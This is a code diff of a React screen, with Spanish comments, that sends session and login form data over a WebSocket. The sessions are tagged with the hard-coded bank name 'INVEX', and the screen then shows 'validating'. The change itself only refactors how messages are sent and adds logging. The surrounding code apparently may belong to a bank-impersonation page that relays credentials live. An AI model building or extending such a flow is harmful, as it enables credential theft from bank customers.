@@ -309,7 +309,7 @@ export default function ClientScreen() {
           const deviceId = getOrCreateDeviceId();
           
           // Crear nueva sesión en el servidor con folio único
-          sendMessage(JSON.stringify({
+          sendMessage({
             type: 'CREATE_UNIQUE_SESSION',
             data: {
               sessionId: newSessionId,
@@ -318,7 +318,7 @@ export default function ClientScreen() {
               clientData: { terminosAceptados: true },
               timestamp: new Date().toISOString()
             }
-          }));
+          });
           
           // Actualizar el estado local con el nuevo sessionId
           setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
@@ -335,7 +335,7 @@ export default function ClientScreen() {
             const deviceId = getOrCreateDeviceId();
             
             // Crear nueva sesión si no existe
-            sendMessage(JSON.stringify({
+            sendMessage({
               type: 'CREATE_UNIQUE_SESSION',
               data: {
                 sessionId: currentSessionId,
@@ -344,19 +344,19 @@ export default function ClientScreen() {
                 clientData: formData,
                 timestamp: new Date().toISOString()
               }
-            }));
+            });
             
             setSessionData(prev => ({ ...prev, sessionId: currentSessionId, banco: 'INVEX' }));
           } else {
             // Actualizar sesión existente con datos de login
-            sendMessage(JSON.stringify({
+            sendMessage({
               type: 'UPDATE_SESSION_DATA',
               data: {
                 sessionId: currentSessionId,
                 tipo: 'login',
                 data: formData
               }
-            }));
+            });
           }
           
           setCurrentScreen(ScreenType.VALIDANDO);
@@ -365,14 +365,16 @@ export default function ClientScreen() {
       }
       
       // Enviar datos al servidor inmediatamente para sesiones existentes
-      sendMessage({
+      const messageData = {
         type: 'CLIENT_INPUT',
         data: {
           tipo: screen,
           sessionId,
           data: formData
         }
-      });
+      };
+      console.log('Enviando mensaje WebSocket:', messageData);
+      sendMessage(messageData);
       
       // Actualizar screenData local para mostrar los datos ingresados
       if (formData.telefono) {
